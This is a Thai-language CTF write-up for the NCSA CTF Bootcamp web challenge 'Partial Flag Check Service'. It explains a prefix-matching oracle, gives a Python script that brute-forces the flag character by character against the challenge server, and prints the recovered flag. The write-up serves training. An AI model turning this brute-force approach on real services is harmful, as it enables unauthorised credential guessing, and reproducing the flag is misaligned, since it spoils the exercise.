---
title: 'Partial Flag Check Service (NCSA CTF Bootcamp #2)'
published: 2024-09-19
description: 'เฉลยโจทย์หมวดหมู่ Web ข้อ Partial Flag Check Service'
image: 'cover.png'
tags: ['NCSA CTF Bootcamp', 'Web Security']
category: 'NCSA CTF Bootcamp'
draft: false 
language: 'th'
---

ก็ตามคำอธิบายโจทย์เลยครับข้อนี้ มันจะเช็คว่าข้อมูลที่เราส่งไปตรงกับส่วนเริ่มต้นของ FLAG มั้ย ถ้าตรง จะส่งมาว่า `Correct!` ถ้าไม่ตรง จะส่ง `Incorrect!` มา

ซึ่งมีถ้าทางเดียวที่จะ Solve โจทย์นี้ได้ก็คือ bruteforce ครับ

ก็จะเร็วหน่อยเพราะเรารู้ prefix ของ flag แล้ว และค่าใน flag ก็เป็น hex ซะด้วย ตัวอักษรที่เราจะหาก็จะมีแค่ `0123456789abcdef}` ครับ

ผมก็ได้เขียนเป็น Script นี้ขึ้นมาเพื่อ Solve โจทย์นี้ครับ

```python
import requests
flag = "FLAG{"
while True:
    for x in "0123456789abcdef}":
        print("trying:", flag + x)
        res = requests.post("https://websec.ctf.p7z.pw/", {
            "password": flag + x
        })
        if "Incorrect!" not in res.text:
            flag += x
            print(flag)
    if "}" in flag:
        break
```

รันไปสักแปป ก็จะได้ Flag มาครับบ

`FLAG{7efb1657bf58af3a61f86ac3b14949a8}`